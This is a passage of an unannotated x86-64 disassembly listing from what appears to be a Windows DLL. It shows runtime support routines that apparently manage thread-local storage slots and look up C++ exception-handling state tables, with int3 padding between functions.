   1800044cc:	ff 15 de db 00 00    	call   *0xdbde(%rip)        # 0x1800120b0
   1800044d2:	48 8b f8             	mov    %rax,%rdi
   1800044d5:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1800044d9:	74 1c                	je     0x1800044f7
   1800044db:	48 85 c0             	test   %rax,%rax
   1800044de:	75 77                	jne    0x180004557
   1800044e0:	8b 0d 8a 8b 01 00    	mov    0x18b8a(%rip),%ecx        # 0x18001d070
   1800044e6:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   1800044ed:	ff 15 c5 db 00 00    	call   *0xdbc5(%rip)        # 0x1800120b8
   1800044f3:	85 c0                	test   %eax,%eax
   1800044f5:	75 04                	jne    0x1800044fb
   1800044f7:	33 ff                	xor    %edi,%edi
   1800044f9:	eb 5c                	jmp    0x180004557
   1800044fb:	ba 80 00 00 00       	mov    $0x80,%edx
   180004500:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   180004505:	b9 01 00 00 00       	mov    $0x1,%ecx
   18000450a:	e8 b1 4b 00 00       	call   0x1800090c0
   18000450f:	8b 0d 5b 8b 01 00    	mov    0x18b5b(%rip),%ecx        # 0x18001d070
   180004515:	48 8b f0             	mov    %rax,%rsi
   180004518:	48 85 c0             	test   %rax,%rax
   18000451b:	74 23                	je     0x180004540
   18000451d:	48 8b d0             	mov    %rax,%rdx
   180004520:	ff 15 92 db 00 00    	call   *0xdb92(%rip)        # 0x1800120b8
   180004526:	85 c0                	test   %eax,%eax
   180004528:	74 10                	je     0x18000453a
   18000452a:	33 ff                	xor    %edi,%edi
   18000452c:	c7 46 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rsi)
   180004533:	8b cf                	mov    %edi,%ecx
   180004535:	48 8b fe             	mov    %rsi,%rdi
   180004538:	eb 13                	jmp    0x18000454d
   18000453a:	8b 0d 30 8b 01 00    	mov    0x18b30(%rip),%ecx        # 0x18001d070
   180004540:	33 d2                	xor    %edx,%edx
   180004542:	ff 15 70 db 00 00    	call   *0xdb70(%rip)        # 0x1800120b8
   180004548:	48 8b ce             	mov    %rsi,%rcx
   18000454b:	33 ff                	xor    %edi,%edi
   18000454d:	e8 de 3c 00 00       	call   0x180008230
   180004552:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180004557:	8b cb                	mov    %ebx,%ecx
   180004559:	ff 15 41 db 00 00    	call   *0xdb41(%rip)        # 0x1800120a0
   18000455f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180004564:	48 8b c7             	mov    %rdi,%rax
   180004567:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   18000456c:	48 83 c4 28          	add    $0x28,%rsp
   180004570:	c3                   	ret
   180004571:	cc                   	int3
   180004572:	cc                   	int3
   180004573:	cc                   	int3
   180004574:	cc                   	int3
   180004575:	cc                   	int3
   180004576:	cc                   	int3
   180004577:	cc                   	int3
   180004578:	cc                   	int3
   180004579:	cc                   	int3
   18000457a:	cc                   	int3
   18000457b:	cc                   	int3
   18000457c:	cc                   	int3
   18000457d:	cc                   	int3
   18000457e:	cc                   	int3
   18000457f:	cc                   	int3
   180004580:	48 83 ec 28          	sub    $0x28,%rsp
   180004584:	48 8d 0d b5 fd ff ff 	lea    -0x24b(%rip),%rcx        # 0x180004340
   18000458b:	ff 15 17 db 00 00    	call   *0xdb17(%rip)        # 0x1800120a8
   180004591:	89 05 d9 8a 01 00    	mov    %eax,0x18ad9(%rip)        # 0x18001d070
   180004597:	83 f8 ff             	cmp    $0xffffffff,%eax
   18000459a:	74 3f                	je     0x1800045db
   18000459c:	48 8d 15 9d 96 01 00 	lea    0x1969d(%rip),%rdx        # 0x18001dc40
   1800045a3:	8b c8                	mov    %eax,%ecx
   1800045a5:	ff 15 0d db 00 00    	call   *0xdb0d(%rip)        # 0x1800120b8
   1800045ab:	85 c0                	test   %eax,%eax
   1800045ad:	74 11                	je     0x1800045c0
   1800045af:	c7 05 ff 96 01 00 fe 	movl   $0xfffffffe,0x196ff(%rip)        # 0x18001dcb8
   1800045b6:	ff ff ff 
   1800045b9:	b0 01                	mov    $0x1,%al
   1800045bb:	48 83 c4 28          	add    $0x28,%rsp
   1800045bf:	c3                   	ret
   1800045c0:	8b 0d aa 8a 01 00    	mov    0x18aaa(%rip),%ecx        # 0x18001d070
   1800045c6:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1800045c9:	74 10                	je     0x1800045db
   1800045cb:	ff 15 ef da 00 00    	call   *0xdaef(%rip)        # 0x1800120c0
   1800045d1:	c7 05 95 8a 01 00 ff 	movl   $0xffffffff,0x18a95(%rip)        # 0x18001d070
   1800045d8:	ff ff ff 
   1800045db:	32 c0                	xor    %al,%al
   1800045dd:	48 83 c4 28          	add    $0x28,%rsp
   1800045e1:	c3                   	ret
   1800045e2:	cc                   	int3
   1800045e3:	cc                   	int3
   1800045e4:	cc                   	int3
   1800045e5:	cc                   	int3
   1800045e6:	cc                   	int3
   1800045e7:	cc                   	int3
   1800045e8:	cc                   	int3
   1800045e9:	cc                   	int3
   1800045ea:	cc                   	int3
   1800045eb:	cc                   	int3
   1800045ec:	cc                   	int3
   1800045ed:	cc                   	int3
   1800045ee:	cc                   	int3
   1800045ef:	cc                   	int3
   1800045f0:	48 83 ec 28          	sub    $0x28,%rsp
   1800045f4:	8b 0d 76 8a 01 00    	mov    0x18a76(%rip),%ecx        # 0x18001d070
   1800045fa:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1800045fd:	74 10                	je     0x18000460f
   1800045ff:	ff 15 bb da 00 00    	call   *0xdabb(%rip)        # 0x1800120c0
   180004605:	c7 05 61 8a 01 00 ff 	movl   $0xffffffff,0x18a61(%rip)        # 0x18001d070
   18000460c:	ff ff ff 
   18000460f:	b0 01                	mov    $0x1,%al
   180004611:	48 83 c4 28          	add    $0x28,%rsp
   180004615:	c3                   	ret
   180004616:	cc                   	int3
   180004617:	cc                   	int3
   180004618:	cc                   	int3
   180004619:	cc                   	int3
   18000461a:	cc                   	int3
   18000461b:	cc                   	int3
   18000461c:	cc                   	int3
   18000461d:	cc                   	int3
   18000461e:	cc                   	int3
   18000461f:	cc                   	int3
   180004620:	48 83 ec 28          	sub    $0x28,%rsp
   180004624:	4d 63 48 1c          	movslq 0x1c(%r8),%r9
   180004628:	4c 8b da             	mov    %rdx,%r11
   18000462b:	48 8b 01             	mov    (%rcx),%rax
   18000462e:	41 8b 04 01          	mov    (%r9,%rax,1),%eax
   180004632:	83 f8 fe             	cmp    $0xfffffffe,%eax
   180004635:	75 50                	jne    0x180004687
   180004637:	4c 8b 4a 08          	mov    0x8(%rdx),%r9
   18000463b:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180004640:	49 63 58 18          	movslq 0x18(%r8),%rbx
   180004644:	4d 8d 14 19          	lea    (%r9,%rbx,1),%r10
   180004648:	4d 85 d2             	test   %r10,%r10
   18000464b:	74 4e                	je     0x18000469b
   18000464d:	45 8b 40 14          	mov    0x14(%r8),%r8d
   180004651:	45 85 c0             	test   %r8d,%r8d
   180004654:	74 36                	je     0x18000468c
   180004656:	4d 8b 1b             	mov    (%r11),%r11
   180004659:	33 d2                	xor    %edx,%edx
   18000465b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004660:	49 63 0c d2          	movslq (%r10,%rdx,8),%rcx
   180004664:	49 03 c9             	add    %r9,%rcx
   180004667:	4c 3b d9             	cmp    %rcx,%r11
   18000466a:	72 07                	jb     0x180004673
   18000466c:	ff c2                	inc    %edx
   18000466e:	41 3b d0             	cmp    %r8d,%edx
   180004671:	72 ed                	jb     0x180004660
   180004673:	85 d2                	test   %edx,%edx
   180004675:	74 15                	je     0x18000468c
   180004677:	8d 42 ff             	lea    -0x1(%rdx),%eax
   18000467a:	49 8d 04 c1          	lea    (%r9,%rax,8),%rax
   18000467e:	8b 44 18 04          	mov    0x4(%rax,%rbx,1),%eax
   180004682:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   180004687:	48 83 c4 28          	add    $0x28,%rsp
   18000468b:	c3                   	ret
   18000468c:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   180004691:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   180004696:	48 83 c4 28          	add    $0x28,%rsp
   18000469a:	c3                   	ret
   18000469b:	e8 c0 49 00 00       	call   0x180009060
   1800046a0:	cc                   	int3
   1800046a1:	cc                   	int3
   1800046a2:	cc                   	int3
   1800046a3:	cc                   	int3
   1800046a4:	cc                   	int3
   1800046a5:	cc                   	int3
   1800046a6:	cc                   	int3
   1800046a7:	cc                   	int3
   1800046a8:	cc                   	int3
   1800046a9:	cc                   	int3
   1800046aa:	cc                   	int3
   1800046ab:	cc                   	int3
   1800046ac:	cc                   	int3
   1800046ad:	cc                   	int3
   1800046ae:	cc                   	int3
   1800046af:	cc                   	int3
   1800046b0:	40 53                	rex push %rbx
   1800046b2:	48 83 ec 20          	sub    $0x20,%rsp
   1800046b6:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1800046bb:	49 8b d8             	mov    %r8,%rbx
   1800046be:	e8 0d ed ff ff       	call   0x1800033d0
   1800046c3:	48 8b 08             	mov    (%rax),%rcx
   1800046c6:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   1800046ca:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   1800046cf:	8b 44 08 04          	mov    0x4(%rax,%rcx,1),%eax
   1800046d3:	48 83 c4 20          	add    $0x20,%rsp
   1800046d7:	5b                   	pop    %rbx
   1800046d8:	c3                   	ret
   1800046d9:	cc                   	int3
   1800046da:	cc                   	int3
   1800046db:	cc                   	int3
   1800046dc:	cc                   	int3
   1800046dd:	cc                   	int3
   1800046de:	cc                   	int3
   1800046df:	cc                   	int3
   1800046e0:	49 63 50 1c          	movslq 0x1c(%r8),%rdx
   1800046e4:	48 8b 01             	mov    (%rcx),%rax
   1800046e7:	44 89 0c 02          	mov    %r9d,(%rdx,%rax,1)
   1800046eb:	c3                   	ret
   1800046ec:	cc                   	int3
   1800046ed:	cc                   	int3
   1800046ee:	cc                   	int3
   1800046ef:	cc                   	int3
   1800046f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800046f5:	57                   	push   %rdi
   1800046f6:	48 83 ec 20          	sub    $0x20,%rsp
   1800046fa:	41 8b f9             	mov    %r9d,%edi
   1800046fd:	49 8b d8             	mov    %r8,%rbx
   180004700:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   180004705:	e8 c6 ec ff ff       	call   0x1800033d0
   18000470a:	48 8b 08             	mov    (%rax),%rcx
   18000470d:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   180004711:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   180004716:	3b 7c 08 04          	cmp    0x4(%rax,%rcx,1),%edi
   18000471a:	7e 04                	jle    0x180004720
   18000471c:	89 7c 08 04          	mov    %edi,0x4(%rax,%rcx,1)
   180004720:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180004725:	48 83 c4 20          	add    $0x20,%rsp
   180004729:	5f                   	pop    %rdi
   18000472a:	c3                   	ret
   18000472b:	cc                   	int3
   18000472c:	cc                   	int3
   18000472d:	cc                   	int3
   18000472e:	cc                   	int3
   18000472f:	cc                   	int3
   180004730:	40 53                	rex push %rbx
   180004732:	48 83 ec 20          	sub    $0x20,%rsp
   180004736:	48 8b c2             	mov    %rdx,%rax
   180004739:	48 85 c9             	test   %rcx,%rcx
   18000473c:	74 55                	je     0x180004793
   18000473e:	48 63 59 18          	movslq 0x18(%rcx),%rbx
   180004742:	4c 8b 4a 08          	mov    0x8(%rdx),%r9
   180004746:	4d 8d 14 19          	lea    (%r9,%rbx,1),%r10
   18000474a:	4d 85 d2             	test   %r10,%r10
   18000474d:	74 44                	je     0x180004793
   18000474f:	44 8b 41 14          	mov    0x14(%rcx),%r8d
   180004753:	45 85 c0             	test   %r8d,%r8d
   180004756:	74 30                	je     0x180004788
   180004758:	4c 8b 18             	mov    (%rax),%r11
   18000475b:	33 d2                	xor    %edx,%edx
   18000475d:	0f 1f 00             	nopl   (%rax)
   180004760:	49 63 0c d2          	movslq (%r10,%rdx,8),%rcx
   180004764:	49 03 c9             	add    %r9,%rcx
   180004767:	4c 3b d9             	cmp    %rcx,%r11
   18000476a:	72 07                	jb     0x180004773
   18000476c:	ff c2                	inc    %edx
   18000476e:	41 3b d0             	cmp    %r8d,%edx
   180004771:	72 ed                	jb     0x180004760
   180004773:	85 d2                	test   %edx,%edx
   180004775:	74 11                	je     0x180004788
   180004777:	8d 42 ff             	lea    -0x1(%rdx),%eax
   18000477a:	49 8d 04 c1          	lea    (%r9,%rax,8),%rax
   18000477e:	8b 44 18 04          	mov    0x4(%rax,%rbx,1),%eax
   180004782:	48 83 c4 20          	add    $0x20,%rsp
   180004786:	5b                   	pop    %rbx
   180004787:	c3                   	ret
   180004788:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   18000478d:	48 83 c4 20          	add    $0x20,%rsp
   180004791:	5b                   	pop    %rbx
